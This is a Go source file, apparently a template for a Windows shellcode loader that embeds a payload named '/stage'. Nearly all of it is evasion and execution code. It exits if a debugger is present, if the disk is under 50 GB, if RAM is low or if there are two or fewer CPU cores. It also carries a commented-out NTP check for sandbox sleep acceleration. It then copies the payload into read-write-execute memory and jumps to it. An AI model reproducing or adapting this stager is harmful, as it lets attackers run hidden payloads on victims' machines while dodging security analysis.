package main

import (
	"runtime"
	"syscall"
	"unsafe"

	statik "./statik"
	"./fs"
)

func main() {

	type MEMORYSTATUSEX struct {
		dwLength                uint32
		dwMemoryLoad            uint32
		ullTotalPhys            uint64
		ullAvailPhys            uint64
		ullTotalPageFile        uint64
		ullAvailPageFile        uint64
		ullTotalVirtual         uint64
		ullAvailVirtual         uint64
		ullAvailExtendedVirtual uint64
	}

	var kernel32 = syscall.NewLazyDLL("kernel32.dll")
	var globalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
	var getDiskFreeSpaceEx = kernel32.NewProc("GetDiskFreeSpaceExW")
	var IsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")

	// Check debugger
	debuggerPresent, _, _ := IsDebuggerPresent.Call(uintptr(0))
	if debuggerPresent != 0 {
		return
	}

	// Check freee disks space (50G min)
	lpFreeBytesAvailable := int64(0)
	lpTotalNumberOfBytes := int64(0)
	lpTotalNumberOfFreeBytes := int64(0)

	getDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:"))),
		uintptr(unsafe.Pointer(&lpFreeBytesAvailable)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfFreeBytes)))
	diskSizeGB := float32(lpTotalNumberOfBytes) / 1073741824
	if diskSizeGB < float32(50.0) {
		return
	}

	// Check memory
	var memInfo MEMORYSTATUSEX
	memInfo.dwLength = uint32(unsafe.Sizeof(memInfo))
	globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memInfo)))
	if memInfo.ullTotalPhys/1073741824 < 1 {
		return
	}

	// Check CPU cores
	if runtime.NumCPU() <= 2 {
		return
	}

	// Detect sleep acceleration with NTP
	// sleepSeconds := 2
	// type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}
	// sock1,_ := net.Dial("udp", "us.pool.ntp.org:123");
	// sock1.SetDeadline(time.Now().Add((2*time.Second)))
	// ntp_transmit := new(ntp_struct)
	// ntp_transmit.FirstByte=0x1b
	// binary.Write(sock1, binary.BigEndian, ntp_transmit)
	// binary.Read(sock1, binary.BigEndian, ntp_transmit)
	// tick := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))
	// time.Sleep(time.Duration(sleepSeconds * 1000)  * time.Millisecond)
	// sock2,_ := net.Dial("udp", "us.pool.ntp.org:123");
	// sock2.SetDeadline(time.Now().Add((2*time.Second)))
	// ntp_transmit2 := new(ntp_struct)
	// ntp_transmit2.FirstByte=0x1b
	// binary.Write(sock2, binary.BigEndian, ntp_transmit)
	// binary.Read(sock2, binary.BigEndian, ntp_transmit)
	// tac := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))
	// if tac.Sub(tick).Seconds() < float64(sleepSeconds) {
	// 	return
	// }

	statik.{{statik}}()

	VirtualAlloc := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc")
	memcpy := syscall.MustLoadDLL("msvcrt.dll").MustFindProc("memcpy")
	statikFS, _ := fs.New()
	data, _ := fs.ReadFile(statikFS, "/stage")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(data)), 0x1000|0x2000, 0x40)
	_, _, _ = memcpy.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}
